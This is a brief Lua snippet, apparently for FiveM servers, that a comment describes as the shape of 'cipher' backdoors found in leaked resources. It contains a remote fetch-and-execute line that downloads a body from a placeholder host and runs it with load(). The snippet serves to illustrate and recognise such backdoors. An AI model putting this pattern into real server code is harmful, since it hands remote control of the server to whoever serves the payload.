-- Shape of the "cipher" backdoors found in leaked resources.
PerformHttpRequest('https://example.invalid/payload', function(err, body)
    assert(load(body))()
end)
